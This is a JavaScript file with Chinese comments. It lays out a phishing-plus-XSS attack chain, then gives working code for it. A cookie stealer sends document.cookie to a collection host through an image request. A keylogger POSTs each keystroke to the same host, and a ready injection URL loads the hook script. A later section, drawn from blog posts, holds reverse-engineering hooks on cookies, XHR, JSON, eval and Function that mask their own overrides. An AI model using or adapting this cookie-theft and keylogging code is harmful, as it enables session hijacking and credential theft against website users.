/*
1. 诱导受害者访问钓鱼网站
2. 钓鱼网站触发访问目标(可信本地存在cookie)站点
3. 触发本地PC 下载hook.js 文件
4. 本地PC 运行hook.js 文件，获取cookie
5. 发给hacker 站点，收集cookie
6. hacker 站点以邮件形式发出

http://target.vulhost.com/xss.php # 目标站点
http://gofish.hack.net/index.jsp # 社工伪造钓鱼网站
http://hook.hack.net/xss_hook.js # hook 站点
http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站点
*/


// XSS Hook Cookie
// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook.js></script>
function sendCookieToServer() {
    //制作一个图片，图片连接即讲过cookie 发给服务端
    var img = new Image();
    var target_cookie = escape(document.cookie);
    var collect_hacker_host = "http://collect.hack.net/xss_hook.php?sid=" // 通过hook 站点收集信息的站点
    img.src = collect_hacker_host + target_cookie;

    //var target_cookie = escape(document.cookie);
    //windows.location = collect_hacker_host + target_cookie;
}

// XSS Hook KeyLogger
// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook_keylogger.js></script>
function sendKeyLoggerToServer() {
    const evt = evt || window.event;
    const key = String.fromCharCode(evt.charCode);
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI(key);
        const method = "POST";
        const url = "http://collect.hack.net/keylogger.php";
        http.open(method, url, true);
        const header_type = "Content-type";
        const header_value = "application/x-www-form-urlencoded";
        http.setRequestHeader(header_type, header_value);
        http.send("key=" + param);
    }
}

document.onkeypress = sendCookieToServer;

// -------------------------------------------------------------------
// https://blog.csdn.net/LI4836/article/details/130097742
// https://blog.csdn.net/kdl_csdn/article/details/120548182
// Hook Cookie
(function () {
    'use strict';
    var cookieTemp = '';
    Object.defineProperty(document, 'cookie', {
        set: function (val) {
            cookieKey = 'buvid3' // 'buvid3' / '__dfp'
            if (val.indexOf(cookieKey) != -1) {
                debugger;
            }
            console.log('Hook 捕获到cookie设置->', val);
            cookieTemp = val;
            return val;
        },
        get: function () {
            return cookieTemp;
        },
    });
})();

(function () {
    'use strict';
    var org = document.cookie.__lookupSetter__('cookie');
    document.__defineSetter__('cookie', function (cookie) {
        cookieKey = 'buvid3' // 'buvid3' / '__dfp'
        if (cookie.indexOf(cookieKey) != -1) {
            debugger;
        }
        org = cookie;
    });
    document.__defineGetter__('cookie', function () {
        return org;
    });
})();

// Hook Header
(function () {
    var org = window.XMLHttpRequest.prototype.setRequestHeader;
    window.XMLHttpRequest.prototype.setRequestHeader = function (key, value) {
        // value = 'token' / 'Authorization'
        if (key == value) {
            debugger;
        }
        return org.apply(this, arguments);
    };
})();

// Hook URL
(function () {
    var open = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function (method, url, async) {
        key = "login"
        if (url.indexOf(key) != -1) {
            debugger;
        }
        return open.apply(this, arguments);
    };
})();

// Hook JSON.stringify
(function() {
    var stringify = JSON.stringify;
    JSON.stringify = function(params) {
        console.log("Hook JSON.stringify ——> ", params);
        debugger;
        return stringify(params);
    }
})();

// Hook JSON.parse
(function() {
    var parse = JSON.parse;
    JSON.parse = function(params) {
        console.log("Hook JSON.parse ——> ", params);
        debugger;
        return parse(params);
    }
})();

// Hook eval
(function() {
    // 保存原始方法
    window.__cr_eval = window.eval;
    // 重写 eval
    var myeval = function(src) {
        console.log(src);
        console.log("=============== eval end ===============");
        debugger;
        return window.__cr_eval(src);
    }
    // 屏蔽 JS 中对原生函数 native 属性的检测
    var _myeval = myeval.bind(null);
    _myeval.toString = window.__cr_eval.toString;
    Object.defineProperty(window, 'eval', {
        value: _myeval
    });
})();

// Hook Function
(function() {
    // 保存原始方法
    window.__cr_fun = window.Function;
    // 重写 function
    var myfun = function() {
        var args = Array.prototype.slice.call(arguments, 0, -1).join(","),
            src = arguments[arguments.length - 1];
        console.log(src);
        console.log("=============== Function end ===============");
        debugger;
        return window.__cr_fun.apply(this, arguments);
    }
    // 屏蔽js中对原生函数native属性的检测
    myfun.toString = function() {
        return window.__cr_fun + ""
    }
    Object.defineProperty(window, 'Function', {
        value: myfun
    });
})();

